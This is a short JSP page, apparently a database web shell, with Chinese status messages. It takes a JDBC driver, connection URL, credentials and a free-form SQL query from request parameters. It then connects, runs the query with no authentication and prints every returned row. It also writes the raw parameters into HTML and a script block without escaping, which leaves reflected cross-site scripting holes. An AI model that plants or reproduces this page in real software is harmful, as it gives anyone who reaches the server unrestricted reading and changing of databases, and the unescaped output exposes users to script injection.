<%@ page import="java.sql.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.io.*" %>
<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<form>
    DRIVER:<input name="driver" id="driver" value="<%=request.getParameter("driver")%>">
    URL:<input name="url" id="url" value="<%=request.getParameter("url")%>">
    USER:<input name="user" id="user" value="<%=request.getParameter("user")%>">
    PASSWD:<input name="passwd" id="passwd" value="<%=request.getParameter("passwd")%>"><br>
    <textarea rows="4" cols="60" name="query" id="query"></textarea></br>
    <button type="submit">executeQuery</button>
</form>
<%
int flag = 0;
try {
    /**start config **/
    String sql = request.getParameter("query");
    String driver = request.getParameter("driver");
    String url = request.getParameter("url");
    String username = request.getParameter("user");
    String password = request.getParameter("passwd");
    /**end config **/

    Class.forName(driver).newInstance();
    Connection conn = DriverManager.getConnection(url,username,password);
    Statement stmt = conn.createStatement();
    flag=1;
    ResultSet rs = stmt.executeQuery(sql);
    ResultSetMetaData rsmd = rs.getMetaData();
    flag=2;
    int num = rsmd.getColumnCount();
    while(rs.next()) {
        for (int i=1; i<=num; i++){

                    out.println(rs.getString(i)+"&nbsp");
           }
           out.println("</br>");
     }

    rs.close();
    stmt.close();
    conn.close();
} catch (Exception e) {
	if (flag>0){
		out.println("连接成功,查询出错!");
		
	}
	if (flag==0){
		out.println("连接失败!");
		
	}
    response.setStatus(200);
    e.printStackTrace();
    
}
%>
<script>
document.getElementById("query").value="<%=request.getParameter("query")%>"
</script>
